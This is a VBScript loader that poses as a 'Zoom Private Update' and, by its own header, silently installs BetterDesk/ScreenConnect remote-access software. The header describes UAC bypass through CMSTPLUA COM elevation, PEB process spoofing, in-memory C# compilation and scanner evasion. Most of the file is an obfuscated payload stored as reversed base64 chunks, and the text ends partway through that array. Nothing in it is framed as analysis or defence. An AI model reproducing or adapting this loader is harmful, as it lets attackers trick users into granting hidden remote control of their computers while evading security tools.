' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "YpXV2xkS1JGTzIDOwM3QBFUQBFUQBFUSzRDSngyZulmc0NFN", _
    "2kWVK1WOrlXY5MDZJF3YM50UthkRixUe2VkSOlWcjJ3QId2L", _
    "DtWRp1UV5gUbO5WerskRBJzdXZHT2N2NxMUQIF0dVNWUDhWS", _
    "lp1RQRFeCJDMqNFc08iZQlXapNlNI5keWdkSNJTQ58WMkBja", _
    "Qh1U192bZxWRhd1SulGNDd3ctF3L2t0ZrdjdNJHTOZGTqV2S", _
    "LVGNB5mY4EFZ2k2cURWORhWR21kVH12UxQUU4BlQIhTRCZUR", _
    "zRHdUlDVO1Eb2xkSvtyYzEHe0k0NXBVe3EVSqlXTvZ1T0NHc", _
    "OJ0L5czNu5GTroUWQ9EUrM0MmVkVLdWZOVUMH9mSN5Wb29SN", _
    "mZ1ZkBTNvtEWCtkWoNXdDVXRChDVv1GOEpWRrdVWTNWbIN0Q", _
    "rUWaqpFWydzYm9Ue59meshkZ2E3RHZ0T6pWSKBnQhx0VW9kT", _
    "FlDcEpFOnVUaHdkUFNFNahlQnZjcRV0KLBVS4VEaTh2aEJjS", _
    "SZjcmtkap9EWrIGe44kQw9UM0sSeyAHNpxkcxhGcTNUTv80N", _
    "I1kQwJDMshESvlUbPRXSvclczZEa4ATdiZ2SDZTULNGTJhle", _
    "LVDbzc3VxoXYYp2Nkdna510dtpFSrMlcR5kdM10L5glR0BDT", _
    "JhzT58EN4djMhdHR5x0SvlGc1Ekeiple2RzLQlEeCp2Nop2V", _
    "rgVWEB1YvQ1Tk9CZxFTO2h2aCZUTPtySph0aIBVTNtkTrQXY", _
    "lRDd5UWeChUdvcFUnJjT0U2MmtiW5ADZldzZhlzKXBzNlNzL", _
    "1oGOCp2N1wUMRdTdOlDcPFzKCNTOnRHZ390N5V1MyZHdXFVO", _
    "jF3K1V0SQ5UaQlEaMZlWaRjMZx2STNHMiRkNxl3Zy5UamZ0R", _
    "rBzcVNkSpZ2TGNEaNNUOalXcOhDcad2U0sGS3kHZrkTeqZne", _
    "hBzZkBVN1d0MvclMaBlTkRjMyQDZOZ2N44EM2FTM5QnSQRWe", _
    "sJVTLlGSM5maOlUUXZmRGVHM4g0N3QkT4QHVx8SZ2Y2LiR3N", _
    "INkQyMESWBVUy40dIpWbpxERsxGUQdjUy12d2YzQvVFZRh2Z", _
    "CB1Q55kTxc0ZohlTzsUT000S4hUboJmYrs0bpd3MEBXUOFFO", _
    "UlVR3QEbThHUTRTMthGdu9UQFdmUlR2N04kU0oXU01kUlRmc", _
    "kRVVEVUdrEGeEtWYNFDOqJHRwQXMyd1QndFd0NVQytmbMZmN", _
    "KxWSatUWTRjR6V2drBjaBR2K4cGUUFFTqV1MXdHTBNHcXd0a", _
    "EZ1YGJERpBFVrg3MZVWVvsCW6lnRwRzKsJUM5xUaWl3Z2pEb", _
    "I9SQF5GMFRmSnVlNpplaYFWMmZEM6dFOnNWeWhEZQNUT1d0N", _
    "wZXTjZ3NL1Ed3UzZytSQzgDSvJ1V3lDUuZEdVd2cylTVxgnY", _
    "2kTTxw2MkdnSHZjSERGcmN2L4JTdMVlW58SSVlGN5UENLJlb", _
    "vYVMpNlNrMWb2VXel90ZwxWOpV2Ktx0KBVUMlxUVtVkUslEd", _
    "td3dxRkW0EzLslXYrc1MzJ3ZlJWVXF0NUdmQt9Ue6tyKPVFZ", _
    "iZETH9WV4I2RCl2VPNmNLd2MptyLaNUeBZ0Yzg0ZUl3U3oma", _
    "iZ1LhNmdE10dCdENBJTNkZlZFBVTxFnRpNmWqVWN6tyR5oXT", _
    "FFVMwtCdY9EU4syM0JXM580YvQkcClTZ3Jkb2hnTQNTRMNnc", _
    "5RWYUVkaZtyTUNzVp9UNOlHVtlmM2pUQnx0auVnWrNHUUV0a", _
    "6RmbQBFdqd1MrY3dwZVaP9SWxFkaQtSVvh2Smp2dzp3M2JVR", _
    "C1WZxYzcyEURFlEOphEMnl1VRpnek9CS6ZldBpHZ0ZndoJne", _
    "yMESaR0YVhkUWhDe5UURVxmdY1kUZJ1U0YlQJtUVsB1SxE0R", _
    "5YUMxgGRFtCcwR2cElEOyZmYvJ0UnhEMMhVMmZ1d59SOJZHe", _
    "HJ1SYV0RNVUS4FlTrsWWr8GaPRlNlB1R0Zlem5UZktUWT10Z", _
    "GV0d1UXQI9mZFllUHZkQmVDTtN1QVRjY5J2SO9kaaN1by9kU", _
    "2VUcCZjZmFFeDdVavNEURF3awIzVv0GTvoXRl1mUpNHZyVHU", _
    "qZlZaJjVupHWxwka5tUdVRkU4E1cqVVTMRjUTRHM3dUW28UO", _
    "tdGNpNnavg2UIdETj10SwQkTJhjY2QkRGpmMu9WZV1UVtF3N", _
    "5EHM5VFWmd2c48EWuh2ciJDZkB1UEBlR01maWh0VrEjeDh1a", _
    "C5WaGNVVrY1YFNnRz9UVzkkZORkRTVVUmVUaxNzQYlFRwkVT", _
    "HVjZr9Ec0ZlSrZWSz92LrEjejVley80c6BTQRVlQQNmWwR1d", _
    "xEUR5tkYN92V1JXNnhUQLJ2LSZ2axRjcJ9GavgXWLFHSRVlN", _
    "vlETRtCRudmdxhlex5Wc1EEM0dGaVdHV04UZWZmRrU2cVljR", _
    "SR2MvQkZ0AVY3QHSKZEUrtGSKhFdNVzUxgkTxYUUMl3bZt2K", _
    "3gme5oFdzgXYQZDdz1WawZ2Yhl0T5g2czUDVyU1UNVlez1mM", _
    "vs0R5FHZp1WcZN3bllVUzFWaEtmU35mbnhGMjNmQ21UTPB3Z", _
    "0gzbENWRZhWePh2c1hkNI5GMXRWS3NXOwdnSwMGRwgkQilkT", _
    "VZkNlp0bvN0Uw4ENnpURQtmeUpWRrdFTqp0cL12LmRVYYpFe", _
    "lBzRUVEckFnd5ZDTw90LX5Ucz4UZ0BXNsJ3KYZ3Twk0ZTNHW", _
    "ktCbYtCa6RzQ0AjRYFEa4I3MtZUeiNDSxkTSCVUQKFUeaZEe", _
    "yRlNrE1T092ZGZ1T1djbadWdHJDeP5UVE90YOdTOwhGU3c3M", _
    "RRDaT9CapBVVVdnbBl2MHV2Sl5kTHt2TLlVWOlDS2RVSYR0b", _
    "TZ2TwZnewdmTaNUTvE2dzhEcvFnbSN1LCdVMTdESGhUdrQ1U", _
    "HNGT1RzU1lDMyZWOx1WRlBjU3FXUvEWMqtSQyRzKRZDOCZmd", _
    "RN0czUHOFNzLWdUTXl3NL9WVox2Si1kcVJldXVHVh1ERud0Y", _
    "BR0dyN0N18ydFx0RvMFVlJFayBlUs1EaylEWRVUMGNVbqNHR", _
    "VVnSHFkZCRGM5MnSaxWa1lTT0sWSxM3Q3gUSzkGcqJUQ5BHa", _
    "oNncQpXNoRWRRpnbyNEeTJUaJtkcpJ1Z2VXZBJnQZ9ydRJVT", _
    "KR0VT9EeLJmVJRzTtplRrg0YORnaBNDe3kmaw42cD1GZyMkN", _
    "CN3YipXQjVVTmRnSysGOxoFRpZWVFlFZOZ3Q5klYPhFWHZzS", _
    "vpWcC5Ua61Ub5oXN2w0Uyw2NF1mWwkETFB1SPx0bJtSNIREW", _
    "ws2b5gDaEtmdRVWW05WZwtmSoNzQStkW4MmatNXYaVlQFNVT", _
    "hN0N3I1QiN2RmtEV0okYvolT5c0UzIGcsNXTXBHUoRVNCJVV", _
    "3tGSXZmd1IzayhVb6JGdwhDW3M2VwIzYpZUQ0BjTV92bNN0Q", _
    "BJGbW9keCdWN4Z0d2lHN4gzLWp3ZGtidWpnRFxWNLFmQxMlQ", _
    "4FWMOl3SJ50NFpUNaNlb3MVWFNnS2MnTw1GdKRFWDlWWylXR", _
    "uZlN25UcEVzZmdzTkZWNY52bIhkSzIkW3gDSl1mcBl3KkJ1T", _
    "rFmR09ScmRWN1Ijd6N2a0VnSmljZ4QHUxVza0ETULl3VaF0S", _
    "hl1KywmVntyNNRzYGVDcLtWU4IXOzNjYwEnQNtWZ3t0ZzlnS", _
    "JF0b54Ub4FzNGF3dkZWNvBnd3YXVptGUid1Q5FEcmJGZ24WN", _
    "Dl1QZdzbKdjajxkSOJ0bhlzKL9SUrNlNZhndxoUdWFWT5pUU", _
    "zYUardTWhlVerQHOF12cwQUduxWbzc2aMJzKkhXSoh1Us50V", _
    "4FjcvAnVXhjSHZ2a3dEWXFzQxR0RYFXcPB1ShlUeURUUNdme", _
    "4x0ZHlzR2gUTC52QKhWdjdEa1MXWyIDbYN2aiJWM0ole1NGe", _
    "4pHUh9CS1NjQHVkTGdXQQhUVTNUTvgUY6lmMi5URuR1UMhUT", _
    "1BFRlJjW3MncrAzN2Yla3U2ZXZndoREUZ5WOzgjMyglazETO", _
    "5JTaXJXbHdHexk2bTp3ZNdlT240dlx0L5xWQTR1br0EShJES", _
    "3A1bzNzTHZnatV3QT9mTNJlUy1EcodjbOhjeDFWdjt2LWZzT", _
    "tl2M0glQ0gFZyc0RjVHWhhjbYV2YqR2M5ImWaNTOro3LIVnW", _
    "kRzT2lVMwRFMaVFdyITVlJkUFZFSwl2KqZmWkdnWvN2R6FDW", _
    "5omcWJUZUZFc2djRO50LSVURMN1dyg2SnZFaiJncpZjRzdkb", _
    "4RDcuNTZIdlT2IXQxRnNTFHbrkmdtN1RL9WZLVzcHRENxFGM", _
    "QdTci90K1czLv9kZIlDe5hmTPV3QzREbVZDOwhVanNEMVNmW", _
    "SF2bGpkTnZWQ1hHTZRjeoREVK9GUT5katpkNvQEaHhGcwhkY", _
    "qticrpVewEXNxkjRw1GcRtSTPNnapp0UEFjdG1GWC5kT2V1V", _
    "51WZyM2MUVkSI50QFVjcFtEcWB3LOtUdrBzdSVlQnB3ZZl2N", _
    "xNGUat2RLVnQp1WYtFmQlhXVntybmtWNMJWO4dnNys2dr52c", _
    "6FmVTJTVUJzaLVlbKFDZ1tGV1dWOV90UlBTQvMkbsVDTthVN", _
    "IJ2UEpHNDpHbmJDd5xEenJ0aWhjNU10TDhzU2gTayIWNxYVY", _
    "rUkcysUb1hUUG90QNRkd0RUTKdXUJRWYXtySP9EcFt0dJ5GN", _
    "SFleh5kNKhlS3ETc4E0MyNETkBnU0knS1cDRalWSvcFWLVXe", _
    "PlTYMN0RSJUUOhHOkpWbjl1R6RlewAFRLFVUWJ0SrlVQut2d", _
    "idTT5hHS3BlSidXY4QUdlJWTvYWRYZjdYJ3TyUXSNFGSvFna", _
    "z8mcI5kRURmcWJ3RhhFUxFzZvUWdhRTUDtyR4tkcqRTVGBHb", _
    "oFVW1BHVs9mWrkXQlxkMOtUOt92V0omS08mZLt0Y0p3UQFzY", _
    "xpnZqF3SwgXONV1QMhFU3N0Sys0Q2MHOvgVZ4gEeCJDTYRXV", _
    "S5WTxFkYkJWOBdGbnB1LMtGbKJTOltmSWtEWTtSS5Q2KzgFV", _
    "0U1TNNHe49yMidjdU9iMGZ0KmBXN1NmTaFlNRpFWKRTbu5kM", _
    "zZmahJGatpUO0MlMRN3UYVDVNNjd5gXcB92VRpFSEdTVpNnS", _
    "1InQVFVTxR0QvhzMxRFMiFjTulkZa9kQ4dzYPZjYHJGTUJDN", _
    "zQVNoZlNzxEMohjZzUUR6NUNwhGcVN1Yx9EVaZXTp1Ub582T", _
    "MJjcyJjeXBnVTZjbwZFNkplWO5WcnhnWzJEVC9EZxB3dHVWY", _
    "oVGeyU2SVJzcCdDMGd3YWR3ZnxGTu9EdxdkTQVFTUdUMG5UV", _
    "JdDeDNmZ21WYvVUWuNWWwQVYSJ3M2E2VzkjR1BDRPFzbq10T", _
    "ytEdChjQUR2dWtSYWJnYZhlZxlHc5IzdTZ0amZEcahWUKJkW", _
    "5Y3ZWZXcipmYkpmSPREZ3lFR18WRkNGWhp3R6BTMvNEc3NVR", _
    "uZTMndnNTxUS0ZXSvxWdwUnWiZDZ29yLYtWMEBFTzpkbzUmY", _
    "zYTUrIkRypkT0kXb0I1VH9GW69yKidUNsBDcuVGW0VWVyhUQ", _
    "ZJEWudEOiNWWmZFbJVGWpJTRSJ0Tm5Gaxc3TwpUduZzNp9CS", _
    "oJ3dV5kZNJnUaplbTZUWaF0d3oXUSdVN49WcttWbYlGTaFzb", _
    "lVXVzFTQSB1bONzT1gUbndFNwgDV5dGSaNVShFnTNtkZVZUY", _
    "YpVSBZlRW92VNJXZVBnM5pESBp1alBTavMFUnd0RLtydzkWV", _
    "qJTerADT1dXSwhVSwEWexQ1ZJhURmlkaLZTeHRzUK9kYxJDT", _
    "0MWU5c1LxIGeIdWT4NWMrYFO0J3bKtmbSp3bFRUUpZ1aBp0Q", _
    "zR2N5o0culjdwAzdJZnaj5kdsBHTxMFeWhlUYhVO3dlQO10T", _
    "XdGe0Q2ahN1My1USTF0U5VXRJNWaClENrMGdP5ET3lkZLdVR", _
    "YJUe0o3QqVmbIZXZ3oFVhdTeshGVrQDdExkQ5d2YwhGc39yY", _
    "mtGczxWUJFnU3kDVxJFSp9kcLt2VrA3bLlmUo9yRLV1KPRTO", _
    "wR1dEdUSjx2S1cFSWRnT1IXRGV0bOJEWNtyQRh3TDNUU2MnY", _
    "jp0TIh0Z1dmMNBzQV9Ua2cTevR0QygDU4JUVw82Y0N3TrFnM", _
    "rhHVGtyUON2VaJUSXJDOvJWSq90RylnNxhkbOFFWnNEUE9SM", _
    "KpGOsJGb1oUSIBHMHdVRNNGd5pWbBtWavN2UqxWZCdEUuJ1T", _
    "qVzYzVzYYlXaRBXS2JDU1QVOr1WM0RUTHFGTrFHeqJnSlhFe", _
    "JVzbClFW4dmZ5VXVsxEMvImNzlXUPRUWyxmY4MGNHp3Radkb", _
    "xpnNrcDZ0R2awp0Zs5UMk9kcwxWTUp3L5YVdhtGaop3cIxmV", _
    "ydjV1AVTJpmekZ1YRRFZKJEeJVXbMhnbalzb0VFTkZ1ZOxWa", _
    "DJUSrIDOsBXd38SWDlENUV3SLJnT0pUOG1maHl2UiFVYpVjM", _
    "DVFc0FDZxk0NrEVdXd0ZCNGVVFVctVUMBRVcSRmd21WUrp2T", _
    "5RGWldHVjNEb5YnbohkQhhzQv4GRtdGVZZXdT9mTFVmTv9WM", _
    "yhHU3A3YycTYycGZ2UnNwZ3SygzbY1UZIhzLRp1bPpldxR2Z", _
    "MFDTWpFTMp1b5clc6p1LwEXQjh1asZlN5F0Q2EXQzNFMWRUc", _
    "UJDcJdWST9CSCl0UldVSSNVZxQ2NqBHOVlGTJl0RzN0Zw1GO", _
    "mV0ZMlFRhd3dXBHVERUOBdkaiFzcBtkTrQGWqZkTy0EbN52Y", _
    "LpVUwNUb2x2ZqdUd2hHcE9COzNTMElkTmxGMUZmYNNjQJF1S", _
    "1omQtJzVlZzTDVkeI52UxdzaThURytCWrk1TGplQyNzU5Fzb", _
    "FN2Z5J1MykFaZ9mYJRmNVRWaiZlQKZFbQpVMWRESHlkVyITZ", _
    "4RDNSRlczIFahRkNJVGUBdUbKhTYkJHbCVXbBZESBZkTpN0S", _
    "6p2crJkR3Ynar5UVLRkRV9kcylGcEZjNpRTaDl3c3UGZw5EN", _
    "TJ1Yut0bEpEOLRWZ3YEWlZjU1pHbDlGSPFEd5hDSQRlZX1Ee", _
    "vUWYJplTUVGRFdGNKxWYIZUNBRWeZJGO5MnanJFWkZTSFl1R", _
    "FVGapR0SOB3RtlFbpJWY4EGbtd0Z6BTcyUWRZZ3U0QUdXlTb", _
    "NlWTDZTO4lzYKtkewgjVqpXYR9kdndTVQJkewU2bNJHdvknZ", _
    "v0WdLNlchZTTBF1ayFmSr9yK4UVO6ZGSQRWMLx2MHZjayQDT", _
    "rYDZJZ3Qv50djFGbXp0VBJnV6xGRMFWRRZ1d29WUFxkSEFHR", _
    "4k2KGhHbzpVc1QjNz80ZRRVQ4pXMBxWT1pkdCx0VLRjayAld", _
    "rk1L4FFU0U1L1xWZN9SQ2k0TmdGO1QneJZTZ2dUQnhmVwJHc", _
    "idjWXZXeQdVTsp2Mz1mM2Y0QlJDNOlHSzdnNKV1SDdUY5JlZ", _
    "4kWc5ljNBFDcMVDcLxGUjdHZkNmRVFXYstyaG5GMsdVaUhWO", _
    "qVTVJN1dEdjcmhDWsFGanplYWZWUllHU1ZndrxGRkJ1dyBTZ", _
    "hVnd5sGV2cHcMtSM1ZjMKd3RuVDRKZEazMEb1t0dW12cUdTO", _
    "SdHb4gFZ2cUeaFDe38iMykTZQ5EME1GeulnNlRWOaNVbh9US", _
    "EFjUYFzTuNERPNkdwsGaRZGURxWW190ZKp3cnF3LWBnbplnQ", _
    "XZVYhpneyFGNkNUNxUFVwgHTIRnU2VjM6Z3KQNXbnZ1cKRjW", _
    "4YEMmdnYDlGUjt0TOZVTwoUZyJGcytyQjllMMBjTwUFVXVXZ", _
    "SFTbZRlez5WO5M2bF9iet5GZNFkVWd0RlxUR58EdMtmTRlFb", _
    "n90ZiNVQHlEMmN2RXdzc0t2KyRlZRtWaNp3SslUd4N1Z1ADb", _
    "ppEVFxWOzlmaUxUavADOO5mdNh3ay0WRWN2bC1WNVB1Ypx2T", _
    "2ZENzNla0omVyc3Y3lkWlpmVlFESxYTNwtGb2gkVKF2U1NDR", _
    "E9SYy1EW1I2L2kDZlZVblh1Z2V2LQVWMWplMnBHeysWN6h3N", _
    "rBFUHVHOQ9kSsx2Sopmc6xGaZ92TyNDU5hURVZFdWBVUMtkd", _
    "sRzLaFkTNBXR3UzTiNFTM1UbJh3aEVUU2A1MzdHavtmbJR2R", _
    "YpXZ3kmcRtCUxhFRtl1bqRFTaFFMYxkau92bldTdBhDR2EHV", _
    "6hzdlpHZQxGWZxkVZp0VmFzUoRzdX5GSrVETHF2RMlkWx9EM", _
    "IZWRhlnTitGdBJjNaVjNwRXW3kDM3B1V2o3QUBjWudmNUZEU", _
    "19yYVp0M5oGMmZXOzQzTyQGR3UnROVnbzY3QtZ1Z6pldtFFZ", _
    "yMneRRVd2omQMpnWDdlQ5sSeodVY3AjaSZ2NHN2ThZHW2Jja", _
    "mlVNah1Y1IlZmhUQhpXaOFkMDtkZUxGRyk3TuFXbJVzKThnR", _
    "xUGR4JFR3xkY51kc0plbplnW3EURr0malVnUPJWWmpnU3MET", _
    "K5Ee0olVwpndwx0dyF3UCJFdjRzMxt0arJUNallU3Y1SEhzS", _
    "FhHUHZjZ3lVN0Y3S0QWZGV1bh5WNjZEVD5WczUXY3V2VMV3R", _
    "KpkWs1UYCREVvQWOC9GcY5GaMdVOWNGMVZmY0IET6NnWKVHe", _
    "vdUZNVWbQd3U0UUWuN2aJBXcpB1cyc0YYJjWpxmSQlndhBXZ", _
    "2cTb2YTWDJHWiBXd3hXRol2UFNmWaRFeKF3T18WMhZjUwcjY", _
    "pRncEhDOTdWRZdndvYmUUh0LvcERDlndCdXdFZUYS1kam9UV", _
    "2QkRYdUWjJTSBtUQw5UWrZ0b3Z1LZVTbNd2VTZ2d2p3VWdnV", _
    "TdDO3lUa5MHRohHU4NzYoZjYoNlTMVzbDt2UNxEUQVFT1kWV", _
    "1cnYJN1Ui5WV6lDSahjYCZXSFRHeTZld0F0VxI3RjJzKxVFe", _
    "GRXTsh2YkNnMwIGRrdDTQ9kMudXbWVXTyAlZitiMXZUO0M2c", _
    "qhFcDpnSpBHewYTTm1kYO92cRlkRC9UYVpGaPhnU5lXUthnb", _
    "v8mbMN3Y0w2YyU0QsREeGpXe0JFVNBTSDRmMOBFUudWTE9yQ", _
    "lZHNkZzT3JkNEdWY0UzNwZTb0U1NvZ0T4MTVKV3S5g1YHdDR", _
    "GhUQvZVTJdmW2pXYVpXMJNTdrc0dxd2KEJkTyQWckVGSUJWR", _
    "SZ0KQd3c5AFNSNGMVNzT18mVRFjRkZ2RJhXNGlmV4RTb4BXN", _
    "BVWc3kHZsFkY3VzVYRWOBp0dLh2dDJVQthVO6hlYGB3S4F1R", _
    "6R3ZsFXTFh2c1F2ZuJmVzx0YQZnRrkVVH90b2F0UxkXakFmc", _
    "yNkZ2h1bZdEdCZWRqd3LIZkMplFT0MlMKVGeNlTWOBTW5JkQ", _
    "IpGNvU3STh3KycDcCdGSrBjWxM0TGV1dHVVWFBzTvZnQoRzV", _
    "sVFdEtWSqd1ZvhUQxY1K3RlUIV2ViJmW6F0RrR3N4lmbxQEU", _
    "nFWRIBTazRDeylDZVlTa4RHciJmTkN2atN1ZmR1brIUaPJnY", _
    "JNEeBtSTaVUNZF3SzYFV1QTU3BTbt5WNzcmTHhmR5VFM0cGZ", _
    "vx2QOFUbC1kSvN1Zz1kcvR1QzZGbWV2NZV0V4okQIN1S2MGW", _
    "al1QEFUSEhDc4wkdV9CSxMjWiRkNn5WaltkW0wUMYlDbyZXe", _
    "ywGVolzcPlnMQhUO5NUexIUQChFcwU0R4kGSrdkT0tyc4hWc", _
    "BpkSvgXUydFbGtSRVdzS4EFW4BlZtBlc0tUVQZkVnh2RrgEV", _
    "LJVWppmShR0QqV0LZZmSxgmdpFjR2dFRhFXWRd3S1FVZkNza", _
    "tpFU4VETOlVNFRmewhjNyoWb0RET6xWODZncFplbv4kZBlXb", _
    "mZVSLBDezlEejhUMXFjcoNmY2UnWHlkVzEkeIh2Y2VXcaV3K", _
    "NZzKnhEcUVmd4oHN4FnQxxWeIpXY0h2cKRHO2cVbUBzaCdlY", _
    "IRmcBRmW3RlSKZke2tUV58UMxl0TvgUbKRWbZxkdrs0auZTd", _
    "zpETvVHS4kzZvVTMpJ2bKVWbwh1Zy1UQpBFTLRGbpBVWRpXQ", _
    "t9Wat5GTo12TkJEMMVTYvkWcUd2b4UkattUe2U0NMdlcURzU", _
    "302Y2MndzJWePFVRWlVWVhHazgndIZDVatWb2k3Y6FWUFdXZ", _
    "5lkS6tCNJJkdvN2SlNWcQRkZsNjNEJmNvQjeKZVM11WRyZEM", _
    "oR1b1g1QThmT4MER6F0KN5WRoVkYBFEbjVmRMFmT2dnRnFzL", _
    "6F0Yw8UZHtyTkJGRzgjWxoETHVWVXdTe1R3T4IzYqRXR5kEc", _
    "rc3ZJhjQGFUaJZ3K5hkeuFjRh9CMW50N6h0Vw92U5onUrtiW", _
    "KFFNIdXUDhDbDplZjlWQzcldxkTe3hlNzRWYLhHavU0RZNmc", _
    "3g0MmdDa29id2kHTP9yczUXdv8kN6hkbhRDRwZnewgnMURGU", _
    "Wp1azNzbC9kRzE0VzwWSrRkWQFXUI90LzR2MahkTv8idQ9iN", _
    "1gkQyU3UWVmQDhmciVEbKREeHBjcjRHT4kWcHd2TnV3Yl1UV", _
    "yJWdnlzRnFjNzkjMRZGWzQzclp2NJVWb5QWNaN0MMxkevg3Y", _
    "2U3UJVlerEkUkhWO2AFOqlkUvsWW4QjWzsUOygUNiRnZSZWN", _
    "3dWNCllVwVGWatERrIzR5AXeVJmSYVjdxsiRQp1S3UTW1YnM", _
    "xEURuFmauFzcuhHVQZ1V6dUeBhVMHZ1R2cFaSpVMyI2a1gDc", _
    "RZnZ4MmY5VjWQdXWXhjcwRld3w2T4dTeyI2aPllQ2lVM0Uke", _
    "IxUUHZGVCdnYip1bEhFb4glYvUjdsNXdzMTYllHOHJzNPh1V", _
    "XZVTmVXNRlXei10c0RHZkdDMEpFc3g1R2JXWO1WM0V3YzVzQ", _
    "mNkTpxWMllDSQNWRvhnTsZ3dQ9kToVUcr4kSYxEWxZ2dBhlb", _
    "oxUTSV2QWtSYrpVb25WTm5kY5klMnJEdVRWS3o0MBhEVmp2b", _
    "4UUOHdWSal2ZxMTc1EDMiBTUyljeklTZMlERSdzbZ12U1clY", _
    "oFlWm50YhlTMwx2dElVRrdEc2NTdot0QzVkZSN0K4NkYLljY", _
    "vtmdMBDOaZVWUFUM6ZmQ6hEcKx2d61mMEJUbrkmNzU2VvlWV", _
    "nBlewYjRh52KjRXYyVETsZWUWpndrBFcstGSjJFTlhzLYxmV", _
    "ZxWbTplNjZXd39id2p1RxMkNsNXZwg0UKt0NnJjZqxkW49yV", _
    "gQ3YlpmYP1ydl5EI9ASbhVmc0NlenRCIgACIK0QKn0TPBFUQ", _
    "pp3ZkACIgAiCNkyclRXeCp3ZkwCKtFWZyR3U5J3btVWTu8US", _
    "0NFcpp1Ru42bpN3clJHct92Qu8USgQ3YlpmYP1ydl5EI9ACc", _
    "w12bD5ibvl2czVmcw12bD5yTJtFIs0WYlJHdTp3ZkgSbhVmc", _
    "kFWZyRCIgACIK0QKzNXZyBXbvNWZEpjOdVGZv1kbvl2czVmc", _
    "pp3ZkgiclRWYlJVbhVmc0NlLPlEI0NWZqJ2TtcXZOBSPgIXZ", _
    "yV3bzRCIgACIK0QK4YEVVpjOddmbpR2bj5WRuQHelR1WgwCc", _
    "lRWYlJHJgACIgoQDpgCZuV0bURWYlJlLyVGZhVmckASPgU2Y", _
    "yR3U6dGJgsTKoU2cvB3cpRkLwlmenRCI7kCKlN3bwNXaE5ic", _
    "gQ3YlpmYP1ydl5EI9ACcjRCIgACIK0QKoU2cvB3cpRkLtFWZ", _
    "hJXYQJXZslGct92QuIXZslGct92Qu02bEVGZvNkLtVGdzl3U", _
    "kASPgkncv1WZN5WSlRXYyVmbldkLwNGJgACIgoQDzJXZ0VWb", _
    "kASPgUGbiFGd1NWZ4VUZ0Fmcl5WZH5CcjRCIgACIK0QZ1JHd", _
    "v9yJg0DIz52bpRHcPJXZslGct92QuA3YkACIgAiCNU2csFmZ", _
    "lR3c5N1JscCbsRmLtVGdzl3UngCQgACIgoQDnsSZ6lWbpRHc", _
    "NdCLnwGbk5Se0lmc1NWZT5SblR3c5N1JscCbsRmLlJ3bD5Sb", _
    "lpmYP1CajFWRy9mRgwHIpcCbsRmLwJXYoN1QuQnZvN3byNWa", _
    "zFEZlNmblJXZmVmUuA3Yk0FZp9mdbBCIgACIgACIK0wegQ3Y", _
    "klmdvJHckACIgAiCN0HIgACIK0QKfRCKkRWQuMXZpxmYtV2c", _
    "oN1QuAnchh2UD5Cdm92cvJ3Yp1EI0NWZqJ2TtcXZOBSPgIXZ", _
    "29mcwRCI9ACdsV3clJHJgACIgoQDyVGZpZ3byBVZk92QwJXY", _
    "gwCcjRCKlNmc192Ut9mcGlHbi1WZzNXQlxWaw12bD5iclRWa", _
    "192QuMncvJncF5CdsV3clJHJoAiZpBCIgAiCNkSZjJXdvNHJ", _
    "gACIK0wJnASPgQHelRHJgACIgACIgAiCNsHIpADI0dWLgQnb", _
    "gkycy9mcyVkL0xWdzVmckAibpBSZkgCIoNWYlJ3bmBCIgACI", _
    "N0HIi4GYyBmIgsCIpgyZulmc0N1bU5SZkASPrACd4VGdkAye", _
    "vpEKoQHelRFbsFUZ0lmcXpjOdVGbpZkLPl0WgACIgACIgAiC", _
    "s5CbsVGazJXZ39Gct02bvp3JgAVTFRlO25WZkACa0FGUt4Wa", _
    "N0HIgACIK0gMgQXa4VGIgACIgACIgoQDpQHelRHJgwSKnc2b", _
    "sJWblN3cBRWZslGct92QuQHb1NXZyRCI9ASZwlHdkACIgAiC", _
    "k9Ga0VWbkACIgAiCNkyJyVGZh9GTt92badCKlBXeURXZH5Se", _
    "k9WbkACIgAiCNkyJulWYNdCKk9Ga0VWT0V2RuUGc5RHJg0DI", _
    "ddmbpJHdztFKgYWagACIgoQDFR0TN9VTP9kW6YnblRCI9ASZ", _
    "pdCI9ASZk9WbkAyegkSKlR2btRCK5RHctVkcPxGb150cJpjO", _
    "qJ2TtcXZOBSPgM3ZyFUZr9mdulGJgACIgoQD9ByJsxWY0Nnb", _
    "dBzWzdmcBV2avZnbpRCIgACIK0QMgcSXbR3YlpmYvdCI0NWZ", _
    "kASPgUGZvNGJgACIgoQDpUGZv1GJoAUXdt1Zulmc0N3Wg0DI", _
    "goQDpM3ZyFUZr9mdulGJgwCbsVnbkgSZr9mdulkLk9Ga0VWb", _
    "0BCIgAiCNsHIoNGdhNGI9pQDlR2bjRSX05WabBCdphXZgACI", _
